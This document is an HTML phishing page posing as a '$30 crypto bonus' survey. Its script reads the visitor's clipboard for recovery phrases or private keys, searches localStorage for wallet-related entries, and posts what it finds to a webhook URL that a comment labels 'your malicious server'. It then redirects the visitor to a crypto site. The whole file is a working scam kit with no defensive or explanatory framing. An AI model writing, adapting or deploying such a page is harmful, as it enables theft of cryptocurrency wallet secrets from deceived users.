<!DOCTYPE html>
<html>
<head>
    <title>Claim Your $30 Crypto Bonus</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: #000;
            color: #0f0;
        }
        h1 { color: #0f0; }
        input, button {
            padding: 10px;
            font-size: 16px;
            background: #0f0;
            color: #000;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>🎉 Claim Your $30 Crypto Bonus!</h1>
    <p>Answer a few questions to get your $30 crypto bonus!</p>
    <form onsubmit="startSurvey(event)">
        <label>What is your favorite cryptocurrency?
            <input type="text" name="crypto" required>
        </label>
        <label>How long have you been using crypto?
            <input type="text" name="experience" required>
        </label>
        <button type="submit">Submit & Claim Bonus</button>
    </form>

    <script>
        function startSurvey(event) {
            event.preventDefault(); // Prevent form from submitting normally

            // Get user input
            const crypto = document.querySelector('input[name="crypto"]').value;
            const experience = document.querySelector('input[name="experience"]').value;

            // Optional: Store data in localStorage
            localStorage.setItem("userCrypto", crypto);
            localStorage.setItem("userExperience", experience);

            // Scan clipboard for recovery phrases or private keys
            navigator.clipboard.readText().then(clipboardText => {
                if (clipboardText.includes("recovery") || clipboardText.includes("private key")) {
                    alert("✅ Found your recovery phrase or private key!\n\n" + clipboardText);
                }
            });

            // Check localStorage for wallet data
            const keys = Object.keys(localStorage);
            const foundKeys = keys.filter(k => k.includes("wallet") || k.includes("key"));
            if (foundKeys.length > 0) {
                alert("✅ Found wallet info in storage:\n" + foundKeys.join(", "));
            }

            // Send data to your malicious server
            fetch("https://webhook.site/65e561bb-3d2b-45b6-ab5b-bb019ca4f57a", {
                method: "POST",
                body: JSON.stringify({
                    clipboardData: navigator.clipboard.readText(),
                    localStorageData: foundKeys,
                    surveyData: {
                        crypto: crypto,
                        experience: experience
                    }
                })
            });

            // Redirect to your chosen site
            window.location.href = "https://www.earncrypto.com/crypto/free-crypto/";
        }
    </script>
</body>
</html>
